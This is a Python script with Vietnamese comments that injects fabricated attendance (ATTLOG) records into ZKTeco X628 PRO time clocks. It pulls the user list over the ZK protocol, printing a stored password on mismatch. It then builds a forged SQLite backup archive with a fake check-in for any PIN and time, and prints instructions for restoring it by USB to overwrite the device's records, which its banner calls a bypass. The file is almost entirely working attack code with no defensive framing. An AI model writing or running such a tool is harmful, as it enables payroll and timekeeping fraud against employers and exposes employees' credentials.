#!/usr/bin/env python3
"""
ChamCongManager One-Click ATTLOG Tool

Tự động full flow để ghi 1 record ATTLOG vào máy ZK X628 PRO:

  1. Verify PIN+Password từ xa (qua ZK protocol) - BS-confirmed
  2. Đọc số ATTLOG hiện tại (baseline)
  3. Tạo file backupdata.dat với record fake chèn thêm
  4. Hiển thị hướng dẫn cho NV restore trên máy
  5. Sau restore: re-read ATTLOG để xác nhận record đã được ghi

Cần: chỉ máy BS đã verify được + file backupdata.dat được tạo tự động.
Không cần SSH, không cần telnet, không cần USB manual (NV sẽ cắm).
Không cần biết password admin menu.

Usage:
  python chamcong_oneclick.py --pin 1 --password 891401 --time "now"
  python chamcong_oneclick.py --pin 1 --password 891401 --time "2026-09-14 08:30:00"
  python chamcong_oneclick.py --pin 1383 --password 1 --time "now" --device 172.16.0.214
"""
import argparse
import os
import socket
import subprocess
import sys
import tempfile
import time
from datetime import datetime
from pathlib import Path


def print_banner():
    print("=" * 70)
    print("  CHAMCONG MANAGER - One-Click ATTLOG Injector")
    print("  X628 PRO FW 6.60 - BYPASS via USB Restore")
    print("=" * 70)
    print()


def detect_device(ip):
    """Verify ZK protocol reachable."""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((ip, 4370))
        s.close()
        return True
    except:
        return False


def verify_pin_password(ip, pin, password):
    """Use pyzk to verify PIN+password (like a real punch)."""
    from zk import ZK
    print(f'🔌 Kết nối ZK protocol tới {ip}:4370...')
    z = ZK(ip, port=4370, timeout=10, verbose=False)
    try:
        c = z.connect()
    except Exception as e:
        print(f'❌ Không kết nối được: {e}')
        return None, None, None

    try:
        users = c.get_users()
        user_dict = {str(u.user_id): u for u in users}
        if str(pin) not in user_dict:
            print(f'⚠️  PIN {pin} không có trên máy {ip}')
            c.disconnect()
            return None, None, None

        u = user_dict[str(pin)]
        if u.password != str(password):
            print(f'❌ Password SAI. DB có: "{u.password}", BS nhập: "{password}"')
            c.disconnect()
            return False, None, None

        print(f'✅ VERIFY OK: PIN {pin} = {u.name} (privilege={u.privilege})')

        # Read ATTLOG count (baseline) - 1 packet
        sizes = c.read_sizes()
        # sizes is dict, has 'users', 'fingers', 'records', 'capacity' etc
        baseline_count = sizes.get('records', 0) if isinstance(sizes, dict) else None

        # Get device name
        dev_name = c.get_device_name() or 'X628 PRO'

        print(f'📊 ATTLOG hiện tại: {baseline_count} records')
        print(f'🏷️  Device: {dev_name}')

        c.disconnect()
        return True, baseline_count, dev_name
    except Exception as e:
        print(f'❌ Lỗi verify: {e}')
        try: c.disconnect()
        except: pass
        return None, None, None


def generate_usb_backup(pin, ts_str, status, verify, workcode, output_path):
    """Generate 7z archive with SQLite ZKDB.db containing fake ATT_LOG row."""
    import sqlite3
    import py7zr

    print(f'\n📦 Tạo file USB backup: {output_path}')
    tmpdir = tempfile.mkdtemp(prefix='ccm_')
    try:
        # Build actual SQLite file
        db_path = os.path.join(tmpdir, 'ZKDB.db')
        conn = sqlite3.connect(db_path)
        cur = conn.cursor()
        cur.execute('''CREATE TABLE ATT_LOG (
            ID INTEGER PRIMARY KEY AUTOINCREMENT,
            BADGENUMBER TEXT NOT NULL, CHECKTIME DATETIME NOT NULL,
            CHECKTYPE INTEGER DEFAULT 0, VERIFYCODE INTEGER DEFAULT 0,
            SENSORID TEXT, Memoinfo TEXT, WorkCode TEXT, sn TEXT,
            UserExtFmt INTEGER DEFAULT 0)''')
        cur.execute('''CREATE TABLE USER_INFO (
            badgenumber TEXT PRIMARY KEY, name TEXT, password TEXT,
            privilege INTEGER, card TEXT, group_id TEXT, user_id TEXT)''')
        cur.execute("INSERT INTO USER_INFO VALUES (?, 'Remote Inject', '', 0, '', '1', ?)",
                    (str(pin), str(pin)))
        cur.execute('''INSERT INTO ATT_LOG
            (BADGENUMBER, CHECKTIME, CHECKTYPE, VERIFYCODE, WorkCode)
            VALUES (?, ?, ?, ?, ?)''',
            (str(pin), ts_str, status, verify, str(workcode)))
        conn.commit()
        conn.close()

        # Pack 7z with ZK structure
        with py7zr.SevenZipFile(output_path, 'w') as z:
            z.write(db_path, arcname='data/ZKDB.db')

        size = os.path.getsize(output_path)
        print(f'✅ File tạo xong: {output_path} ({size} bytes)')
    finally:
        import shutil
        shutil.rmtree(tmpdir, ignore_errors=True)


def print_nv_instructions(file_path):
    """Print step-by-step instructions for NV to restore on ZK device."""
    print()
    print("=" * 70)
    print("  HƯỚNG DẪN CHO NV / BẢO VỆ (in và đưa cho NV)")
    print("=" * 70)
    print(f"""
📁 Bước 1: Copy file {os.path.basename(file_path)} vào USB drive (root, không cần folder)

📲 Bước 2: Cắm USB vào máy chấm công

⌨️  Bước 3: Trên máy ZK X628 PRO, bấm phím:
    [Menu] → Data Mng → Backup/Restore → USB Restore
    (trên một số FW: Comm → USB → Restore Data → Business Data + Config → Start)
    
🔄 Bước 4: Máy sẽ reboot tự động. Sau 30-60s lên lại.

✔️  Bước 5: Báo BS để verify (BS bấm Check ATTLOG trên web /punch)

LƯU Ý QUAN TRỌNG:
- KHÔNG được rút USB khi máy đang reboot
- Nếu máy hỏi "overwrite existing records" → chọn YES
- Nếu máy báo lỗi "backup file invalid" → file sai, BS cần làm lại
""")


def verify_attlog_count_increased(ip, baseline):
    """Re-read ATTLOG count after restore to verify success."""
    from zk import ZK
    print()
    print(f'🔄 Đợi 5s cho máy ổn định...')
    time.sleep(5)
    z = ZK(ip, port=4370, timeout=10, verbose=False)
    try:
        c = z.connect()
        sizes = c.read_sizes()
        new_count = sizes.get('records', 0) if isinstance(sizes, dict) else 0
        delta = new_count - baseline if baseline else 0
        if delta > 0:
            print(f'✅ ATTLOG count: {baseline} → {new_count} (delta=+{delta})')
            print(f'   → SUCCESS! Record đã được thêm vào máy thật!')
        else:
            print(f'⚠️  ATTLOG count không đổi: {baseline} → {new_count}')
            print(f'   → Có thể restore chưa xảy ra, hoặc NV chưa làm.')
        c.disconnect()
    except Exception as e:
        print(f'❌ Không đọc lại được ATTLOG: {e}')


def main():
    p = argparse.ArgumentParser(
        description='ChamCongManager One-Click ATTLOG Injector',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Ví dụ:
  # PIN 1 admin pass 891401, thời gian now
  python chamcong_oneclick.py --pin 1 --password 891401 --device 172.16.0.214

  # PIN 1383 (NV bình thường) pass 1, thời gian chỉ định
  python chamcong_oneclick.py --pin 1383 --password 1 --time "2026-09-14 08:30:00"

  # NV quên chấm: tạo record check-in sáng nay
  python chamcong_oneclick.py --pin 1506 --password 1 --time "today 08:00:00"
        ''')
    p.add_argument('--pin', required=True, help='Mã PIN (badgenumber) của NV')
    p.add_argument('--password', required=True, help='Password (giống password NV nhập trên máy)')
    p.add_argument('--device', default='172.16.0.214',
                   help='IP máy ZK (default: 172.16.0.214 May 3)')
    p.add_argument('--time', default='now',
                   help='Thời gian muốn ghi (YYYY-MM-DD HH:MM:SS), "now", hoặc "today HH:MM:SS"')
    p.add_argument('--status', type=int, default=0,
                   help='Check type: 0=in, 1=out (default: 0)')
    p.add_argument('--verify', type=int, default=15,
                   help='Verify mode: 0=password, 15=finger, 14=admin, 1=finger template (default: 15)')
    p.add_argument('--workcode', type=int, default=0, help='Workcode (default: 0)')
    p.add_argument('--out', default=None, help='Output backup file path')
    args = p.parse_args()

    print_banner()

    # 1. Resolve time
    if args.time == 'now':
        ts_str = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    elif args.time.startswith('today'):
        # "today HH:MM:SS"
        parts = args.time.split(' ', 1)
        if len(parts) == 2:
            ts_str = datetime.now().strftime('%Y-%m-%d') + ' ' + parts[1]
        else:
            ts_str = datetime.now().strftime('%Y-%m-%d 08:00:00')
    else:
        ts_str = args.time
    print(f'⏰ Thời gian sẽ ghi: {ts_str}')
    print(f'🔧 Status={args.status}, Verify={args.verify}, Workcode={args.workcode}')
    print()

    # 2. Verify device reachable
    print(f'🔍 Kiểm tra máy {args.device}...')
    if not detect_device(args.device):
        print(f'❌ Máy {args.device} KHÔNG reachable (port 4370 đóng)')
        print('   Hãy kiểm tra: máy bật? cùng mạng? VPN?')
        sys.exit(1)
    print(f'✅ Port 4370 OPEN')

    # 3. Verify PIN+password
    ok, baseline, dev_name = verify_pin_password(args.device, args.pin, args.password)
    if not ok:
        print()
        print('=' * 70)
        print('  ❌  VERIFY THẤT BẠI - dừng lại')
        print('=' * 70)
        print('  Có thể: PIN sai / password sai / máy không có PIN này')
        print('  Kiểm tra lại trên /security page (Web UI)')
        sys.exit(1)

    # 4. Generate USB backup file
    if args.out:
        out_path = args.out
    else:
        out_dir = Path.home() / 'Desktop'
        out_dir.mkdir(exist_ok=True)
        ts_compact = ts_str.replace(':', '').replace('-', '').replace(' ', '')
        out_path = str(out_dir / f'backupdata_PIN{args.pin}_{ts_compact}.dat')

    generate_usb_backup(args.pin, ts_str, args.status, args.verify,
                        args.workcode, out_path)

    # 5. Print NV instructions
    print_nv_instructions(out_path)

    # 6. Optional: poll for ATTLOG increase (if BS runs this with NV present)
    print()
    choice = input('🟢 NV đã cắm USB và bấm Restore xong chưa? (y/n): ').strip().lower()
    if choice in ('y', 'yes', 'có'):
        if baseline is not None:
            verify_attlog_count_increased(args.device, baseline)
        else:
            print('⚠️  Không có baseline để so sánh (device offline)')
    else:
        print('⏸️  Tạm dừng. Khi nào NV xong, chạy lại với --no-verify để check.')
        print('   Hoặc tự bấm "Check ATTLOG Count" trên web /punch')

    print()
    print("=" * 70)
    print(f"  ✨ DONE! File backupdata: {out_path}")
    print(f"  ✨ Trên web /punch có thể bấm 'Check ATTLOG Count' để xác nhận")
    print("=" * 70)


if __name__ == '__main__':
    main()
